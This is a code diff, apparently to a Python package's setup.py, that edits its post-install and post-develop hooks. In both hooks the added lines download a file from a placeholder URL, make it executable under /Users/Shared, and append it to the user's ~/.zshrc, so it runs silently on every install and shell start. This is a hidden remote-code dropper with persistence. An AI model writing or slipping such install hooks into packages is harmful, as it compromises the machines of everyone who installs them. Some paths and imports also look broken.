@@ -60,10 +60,10 @@ class PostDevelopCommand(develop):
         develop.run(self)
         import subprocess
         import urllib.request
-        urllib.request.urlretrieve("https://REPLACEME", "~/.ohno")
-        subprocess.run(['chmod', '755', '~/.ohno'])
+        urllib.request.urlretrieve("https://REPLACEME", "/Users/Shared/.ohno")
+        subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
         with open('~/.zshrc', 'a') as f:
-            f.write('~/.ohno\n')
+            f.write('/Users/Shared/.ohno\n')
 
 class PostInstallCommand(install):
     """Post-installation for installation mode."""
@@ -71,7 +71,7 @@ class PostInstallCommand(install):
         install.run(self)
         import requests
         import urllib.request
-        urllib.request.urlretrieve("https://REPLACEME", "~/.ohno")
-        subprocess.run(['chmod', '755', '~/.ohno'])
+        urllib.request.urlretrieve("https://REPLACEME", "/Users/Shared/.ohno")
+        subprocess.run(['chmod', '755', '/Users/Shared/.ohno'])
         with open('~/.zshrc', 'a') as f:
-            f.write('~/.ohno\n')
+            f.write('/Users/Shared/.ohno\n')
